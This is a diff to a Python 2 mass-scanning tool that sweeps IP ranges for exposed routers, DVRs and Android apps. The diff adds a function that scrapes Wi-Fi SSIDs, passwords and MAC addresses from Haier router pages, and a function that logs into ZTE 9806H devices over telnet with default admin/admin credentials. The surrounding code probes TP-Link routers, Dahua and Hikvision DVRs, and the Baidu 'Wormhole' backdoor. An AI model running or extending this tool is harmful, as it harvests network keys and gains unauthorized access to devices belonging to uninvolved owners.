@@ -29,7 +29,7 @@ def ip_range(start, end):
 
 #main function
 def bThread(iplist):
-    
+
     threadl = []
     queue = Queue.Queue()
     for host in iplist:
@@ -37,11 +37,11 @@ def bThread(iplist):
 
     for x in xrange(0, int(sys.argv[2])):
         threadl.append(tThread(queue))
-        
+
     for t in threadl:
         t.start()
     for t in threadl:
-        t.join()        
+        t.join()
 
 #create thread
 class tThread(threading.Thread):
@@ -50,8 +50,8 @@ class tThread(threading.Thread):
         self.queue = queue
 
     def run(self):
-        
-        while not self.queue.empty(): 
+
+        while not self.queue.empty():
             host = self.queue.get()
             try:
                 getinfo(host)
@@ -60,15 +60,16 @@ class tThread(threading.Thread):
 
 def getinfo(host):
 
-    ports = [80,81,82,83,84,85,86,87,88,89,90]
+    ports = range(80,100)
 
     checkTplink(host)
     check9806H(host)
     checkWormhole(host)
-    
+
     for k in ports:
         checkDahuaDVR(host,str(k))
         checkHKDVR(host,str(k))
+        checkHaierWifi(host,str(k))
 
 def checkTplink(host):
 
@@ -97,7 +98,7 @@ def checkTplink(host):
         t.close()
 
         if len(wifiStr) > 0:
-            
+
             #clear extra space
             wifiStr = "".join(wifiStr.split())
             #get SID KEY MAC
@@ -165,6 +166,52 @@ def check9806H(host):
     except Exception,e:
         pass
 
+def checkHaierWifi(host,port):
+
+    try:
+        req = requests.get(url = 'http://'+host+':'+port)
+        html_code = req.content
+
+        title = re.findall(r'<title>(.+?)</title>',html_code)
+
+        if title[0].encode('utf8') == "Haier Wifi":
+            ssid = re.findall(r'var ssid = \'(.+?)\'',html_code)
+            key = re.findall(r'var psk = \'(.+?)\'',html_code)
+            wanmac = re.findall(r'var factoryWanMac=\"(.+?)\"',html_code)
+            print  'Found [Router] [Haier Wifi] Host : http://'+ host +':'+ port +' SSID:'+ssid[0]+' KEY:'+key[0]+' MAC:'+wanmac[0]
+
+    except Exception,e:
+        pass
+
+def checkZteFxxx(host):
+
+    try:
+        t = telnetlib.Telnet(host, timeout = 5)
+        t.read_until("9806", 5)
+        firstStr = t.read_very_eager()
+
+        if len(firstStr) > 0:
+            t.write("\n")
+            t.read_until("Login:", 5)
+            t.write("admin\r\n")
+            t.read_until("Password:", 5)
+            t.write("admin\r\n")
+            t.read_until("\n", 5)
+            time.sleep(5)
+
+            loginStr = t.read_very_eager()
+            resultStr = loginStr.split('>')
+
+            if len(resultStr) > 1:
+                print  'Found [Router] [ZTE 9806H] Host : '+ host +':23 Info : '+ resultStr[0].replace('\r\n','')
+            else:
+                print  'Found [Router] [ZTE 9806H] Host : '+ host +':23 Info : Login Failed.'
+        else:
+            t.close()
+
+    except Exception,e:
+        pass
+
 def checkWormhole(host):
 
     aimurl = "http://%s:40310/getserviceinfo?mcmdf=inapp_baidu_bdgjs&callback=jsonp" % (host)
@@ -177,7 +224,7 @@ def checkWormhole(host):
         print  'Found [Android] [Wormhole] Host : '+ host +':40310 Info : '+response
 
     except Exception,e:
-        return 
+        return
 
 if __name__ == '__main__':
     print 'Just make a test in the extent permitted by law  (^_^)'
